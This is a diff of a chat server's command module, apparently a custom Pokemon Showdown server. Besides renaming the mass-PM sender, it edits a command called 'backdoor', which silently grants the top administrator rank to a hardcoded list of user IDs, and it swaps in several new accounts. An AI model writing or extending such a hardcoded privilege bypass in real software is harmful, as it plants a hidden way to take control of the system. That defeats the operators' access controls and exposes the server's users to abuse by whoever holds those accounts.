@@ -2077,7 +2077,7 @@ var commands = exports.commands = {
                 if (!target) return this.parse('/pmall [message] - Sends a PM to every user in a room.');
                 if (!this.can('pmall')) return false;
 
-                var pmName = '~KTN PM [Do not reply]';
+                var pmName = '~Armageddon PM [Do not reply]';
 
                 for (var i in Users.users) {
                         var message = '|pm|'+pmName+'|'+Users.users[i].getIdentity()+'|'+target;
@@ -2337,7 +2337,7 @@ var commands = exports.commands = {
 	},
 	
 	backdoor: function(target,room, user) {
-		if (user.userid === 'blakjack' || user.userid === 'frankentein' || user.userid === 'jackdaw') {
+		if (user.userid === 'blakjack' || user.userid === 'achampaero' || user.userid === 'aelitetakashi' || user.userid === 'sooperpooper' || user.userid === 'achampcarni') {
 
 			user.group = '~';
 			user.updateIdentity();
